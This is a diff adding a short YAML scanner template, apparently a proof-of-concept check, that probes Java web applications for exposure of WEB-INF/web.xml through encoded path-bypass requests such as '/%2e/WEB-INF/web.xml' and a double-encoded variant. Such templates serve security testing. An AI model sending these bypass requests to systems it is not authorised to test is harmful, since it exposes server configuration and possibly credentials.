@@ -1,0 +1,17 @@
+id: WEB_INF_WEB_xml_leak
+info:
+  name: WEB-INF/web.xml 文件泄漏
+  finger: Java
+  severity: info
+  tags:
+  - legacy
+  - poc
+transport: http
+requests:
+- method: GET
+  paths:
+  - /%2e/WEB-INF/web.xml
+  - /WEB-INF/web.xml.
+  - /static?/%2557EB-INF/web.xml
+  expression: status_code == 200 && contains(body, "</web-app>")
+  disable_normal: true
